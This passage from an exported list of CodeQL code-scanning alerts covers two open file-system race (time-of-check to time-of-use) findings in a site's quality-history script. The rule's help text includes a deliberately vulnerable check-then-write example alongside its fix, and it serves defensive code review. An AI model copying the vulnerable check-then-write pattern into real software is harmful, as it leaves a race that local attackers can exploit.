      "name": "js/file-system-race",
      "tags": ["external/cwe/cwe-367", "security"],
      "full_description": "Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.",
      "help": "# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n",
      "security_severity_level": "high"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "The file may have changed since it was checked." },
      "location": {
        "path": "scripts/append_quality_history.mjs",
        "start_line": 94,
        "end_line": 94,
        "start_column": 9,
        "end_column": 46
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/2/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 1,
    "created_at": "2025-08-27T03:03:15Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/1",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/1",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/file-system-race",
      "severity": "warning",
      "description": "Potential file system race condition",
      "name": "js/file-system-race",
      "tags": ["external/cwe/cwe-367", "security"],
      "full_description": "Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.",
      "help": "# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n",
      "security_severity_level": "high"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "The file may have changed since it was checked." },
      "location": {
        "path": "scripts/append_quality_history.mjs",
        "start_line": 93,
        "end_line": 93,
        "start_column": 39,
        "end_column": 65
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/1/instances",
    "dismissal_approved_by": null
  }
]
